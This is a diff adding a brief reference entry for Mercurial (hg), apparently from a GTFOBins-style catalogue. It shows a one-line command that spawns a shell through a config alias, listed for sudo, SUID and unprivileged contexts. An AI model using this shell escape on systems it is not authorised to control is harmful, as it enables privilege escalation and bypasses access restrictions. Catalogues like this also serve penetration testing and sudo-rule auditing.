@@ -1,0 +1,14 @@
+hg
+==
+
+Shell
+-----
+
+[Sudo]
+    hg --config alias.x='!/bin/sh' x
+
+[SUID]
+    hg --config alias.x='!/bin/sh' x
+
+[Unprivileged]
+    hg --config alias.x='!/bin/sh' x
